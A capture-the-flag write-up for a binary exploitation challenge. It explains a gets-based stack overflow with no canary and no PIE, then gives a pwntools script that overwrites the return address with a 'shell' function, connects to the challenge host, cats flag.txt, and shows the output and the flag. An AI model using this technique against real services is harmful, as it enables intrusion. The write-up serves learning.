https://ctftime.org/event/2209/

# win... win... window...!

You are a skilled hacker known for your expertise in binary exploitation. One day, you receive an anonymous message challenging your abilities. The message contains a mysterious binary file. Now you decide to analyze the file.

Connection Information

`nc 173.255.201.51 3337`

## Solution

In `main/0x40118a` there is call to `gets` with a buffer on the stack. 0x12 bytes to return address with no stack canary. There is a function called `shell/0x401156` with no pie we can simply return to `shell` by overflowing the buffer on the stack in `main` with `gets`:

```
from pwn import *

SHELL = 0x00401157

#p = process("./win")
p = remote("173.255.201.51", 3337)

p.readline()

payload = b"A" * 0x12
payload += p64(SHELL)

p.sendline(payload)

p.sendline(b"/bin/cat flag.txt")

p.interactive()
```

```
$ python3 ./go.py 
[+] Opening connection to 173.255.201.51 on port 3337: Done
[*] Switching to interactive mode
KCTF{r3T_7o_W1n_iS_V3rRY_3AsY}$ 
[*] Closed connection to 173.255.201.51 port 3337
```

## Flag
`KCTF{r3T_7o_W1n_iS_V3rRY_3AsY}`
